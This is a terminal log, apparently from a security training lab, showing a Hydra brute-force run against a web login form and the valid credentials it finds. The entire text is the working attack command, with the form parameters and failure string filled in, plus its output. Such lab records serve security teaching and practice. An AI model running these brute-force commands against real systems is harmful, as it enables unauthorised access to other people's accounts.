```
root@attackdefense:~/Desktop# hydra -L users.txt -P passwords.txt 192.30.67.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-04 20:24:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 404 login tries (l:4/p:101), ~26 tries per task
[DATA] attacking http-post-form://192.30.67.3:80/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!
[80][http-post-form] host: 192.30.67.3   login: bee   password: bug
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-04 20:24:27
```

